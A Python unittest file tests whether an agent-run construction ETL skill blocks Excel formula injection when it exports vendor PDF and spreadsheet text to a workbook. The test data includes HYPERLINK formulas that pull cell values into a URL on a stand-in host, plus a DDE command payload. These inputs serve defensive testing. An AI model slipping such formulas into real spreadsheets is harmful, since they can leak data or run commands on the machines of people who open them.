"""Formula injection through the construction ETL skill.

The skill text in SKILL.md is the implementation an agent runs. These tests
load that implementation and drive ConstructionETLPipeline.run and
simple_etl_pipeline with cell text a vendor can put in a PDF table or an
Excel text cell.

They fail while any of that text is stored as an Excel formula. They pass
once every exported string, column header, and index label is inert text and
the original characters are still in the workbook (a single leading
apostrophe is accepted, because that is how a text cell keeps a leading
equals sign).

Neutralizing before clean_construction_data strips whitespace is not enough:
a value such as "   =HYPERLINK(...)" does not start with "=" until strip
runs, and Category is title-cased after that. Summary is grouped from the
cleaned Category, and By_Level uses Category as column headers, so both
sheets have to be inert too. simple_etl_pipeline never calls the cleaner; it
writes the grouped Category index itself.

Not covered here, because they do not share this sink:
- generate_pdf_report and load_to_database do not write an xlsx workbook
- Volume, Area, Length, Quantity, and Cost are coerced with
  to_numeric(errors="coerce") before export, so a formula string in those
  columns becomes missing data rather than a formula
- a real formula cell in a source xlsx is read by pandas with data_only=True
  and does not come back as the formula text; the Excel case below is a
  text cell whose characters start with "="
- openpyxl only stores a string as a formula when its length is greater
  than 1 and it starts with "=". A leading "+", "-", or "@" is left as text
"""

from __future__ import annotations

import ast
import tempfile
import unittest
from pathlib import Path

from openpyxl import Workbook, load_workbook
from reportlab.lib import colors
from reportlab.lib.pagesizes import landscape, A4
from reportlab.platypus import SimpleDocTemplate, Table, TableStyle

SKILL_PATH = Path(__file__).resolve().parents[1] / "SKILL.md"

# Concatenates other cells into a URL. example.test is a reserved name and
# is never requested; the assertion is only about the workbook cell type.
EXFIL = '=HYPERLINK("http://example.test/q?"&A2&B2,"Click")'
CATEGORY_EXFIL = '=HYPERLINK("http://example.test/c?"&C2,"Wall")'
HEADER_EXFIL = '=HYPERLINK("http://example.test/h","Hdr")'
DDE = "=cmd|'/C calc'!A0"


def load_skill_namespace():
    """Execute the skill's function and class definitions, not its samples."""
    text = SKILL_PATH.read_text(encoding="utf-8")
    blocks = []
    fence = "```python\n"
    start = 0
    while True:
        begin = text.find(fence, start)
        if begin < 0:
            break
        body_at = begin + len(fence)
        end = text.find("```", body_at)
        if end < 0:
            break
        blocks.append(text[body_at:end])
        start = end + 3

    namespace = {"__name__": "etl_skill"}
    for index, block in enumerate(blocks):
        try:
            tree = ast.parse(block)
        except SyntaxError:
            continue
        kept = [
            node
            for node in tree.body
            if isinstance(node, (ast.FunctionDef, ast.ClassDef, ast.Import, ast.ImportFrom))
        ]
        if not kept:
            continue
        module = ast.Module(body=kept, type_ignores=[])
        ast.fix_missing_locations(module)
        try:
            exec(compile(module, f"{SKILL_PATH} block {index}", "exec"), namespace)
        except ModuleNotFoundError:
            continue
    missing = [
        name
        for name in (
            "simple_etl_pipeline",
            "extract_excel_files",
            "extract_from_pdfs",
            "clean_construction_data",
            "generate_excel_report",
            "ConstructionETLPipeline",
        )
        if name not in namespace
    ]
    if missing:
        raise AssertionError(f"SKILL.md did not define {missing}")
    return namespace


def write_text_workbook(path, headers, rows):
    """Write an xlsx whose cells are text, including values that start with '='.

    Assigning such a string through openpyxl would otherwise store a formula.
    Forcing the text type matches a spreadsheet cell that holds those
    characters as text, which is what pandas reads back.
    """
    workbook = Workbook()
    sheet = workbook.active
    sheet.append(list(headers))
    for row in rows:
        sheet.append(list(row))
    for cells in sheet.iter_rows():
        for cell in cells:
            if isinstance(cell.value, str):
                cell.data_type = "s"
    workbook.save(path)


def write_table_pdf(path, rows):
    document = SimpleDocTemplate(str(path), pagesize=landscape(A4))
    table = Table(rows, repeatRows=1)
    table.setStyle(
        TableStyle(
            [
                ("GRID", (0, 0), (-1, -1), 0.4, colors.black),
                ("FONTSIZE", (0, 0), (-1, -1), 6),
                ("VALIGN", (0, 0), (-1, -1), "MIDDLE"),
            ]
        )
    )
    document.build([table])


def displayed_text(value):
    if not isinstance(value, str):
        return None
    if value.startswith("'"):
        return value[1:]
    return value


def assert_workbook_is_inert(path, expected_texts):
    workbook = load_workbook(path, data_only=False)
    seen = []
    formulas = []
    for sheet in workbook.worksheets:
        for row in sheet.iter_rows():
            for cell in row:
                if cell.data_type == "f":
                    formulas.append(f"{sheet.title}!{cell.coordinate}={cell.value!r}")
                text = displayed_text(cell.value)
                if text is not None:
                    seen.append(text)
    if formulas:
        raise AssertionError(
            "workbook stored extracted text as formulas:\n" + "\n".join(formulas)
        )
    missing = [text for text in expected_texts if text not in seen]
    if missing:
        raise AssertionError(
            "workbook dropped extracted text:\n"
            + "\n".join(repr(text) for text in missing)
            + "\ncells:\n"
            + "\n".join(repr(text) for text in seen)
        )


class FormulaInjectionTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.skill = load_skill_namespace()

    def setUp(self):
        self.tmpdir = tempfile.TemporaryDirectory()
        self.root = Path(self.tmpdir.name)

    def tearDown(self):
        self.tmpdir.cleanup()

    def test_pdf_folder_report_keeps_formula_text_inert(self):
        pdf_dir = self.root / "pdfs"
        pdf_dir.mkdir()
        padded = f"  {EXFIL}  "
        write_table_pdf(
            pdf_dir / "vendor-quantities.pdf",
            [
                ["Category", "Description", "Volume", "Cost", "Level", HEADER_EXFIL],
                [CATEGORY_EXFIL, EXFIL, "12", "30", "L1", "note"],
                ["Concrete", padded, "3", "4", "L2", "other"],
            ],
        )
        output = self.root / "pdf-report.xlsx"
        pipeline = self.skill["ConstructionETLPipeline"](
            {"pdf_folder": str(pdf_dir), "excel_output": str(output)}
        )
        pipeline.run()

        assert_workbook_is_inert(
            output,
            [
                EXFIL,
                CATEGORY_EXFIL.title(),
                HEADER_EXFIL,
            ],
        )

    def test_excel_folder_report_keeps_formula_text_inert(self):
        excel_dir = self.root / "sheets"
        excel_dir.mkdir()
        write_text_workbook(
            excel_dir / "vendor-quantities.xlsx",
            ["Category", "Description", "Volume", "Cost", "Level", HEADER_EXFIL],
            [
                [f"  {CATEGORY_EXFIL}", EXFIL, 12, 30, "L1", "note"],
                ["Concrete", f"\t{DDE}", 3, 4, "L2", "other"],
                ["Masonry", f"   {EXFIL}   ", 1, 2, "L1", "tail"],
            ],
        )
        output = self.root / "excel-report.xlsx"
        pipeline = self.skill["ConstructionETLPipeline"](
            {"excel_folder": str(excel_dir), "excel_output": str(output)}
        )
        pipeline.run()

        assert_workbook_is_inert(
            output,
            [
                EXFIL,
                CATEGORY_EXFIL.title(),
                HEADER_EXFIL,
                DDE,
            ],
        )

    def test_simple_etl_pipeline_keeps_category_formula_text_inert(self):
        source = self.root / "raw.xlsx"
        output = self.root / "simple-report.xlsx"
        write_text_workbook(
            source,
            ["Category", "Quantity", "Unit_Price"],
            [[EXFIL, 2, 5]],
        )
        self.skill["simple_etl_pipeline"](str(source), str(output))
        assert_workbook_is_inert(output, [EXFIL])


if __name__ == "__main__":
    unittest.main()
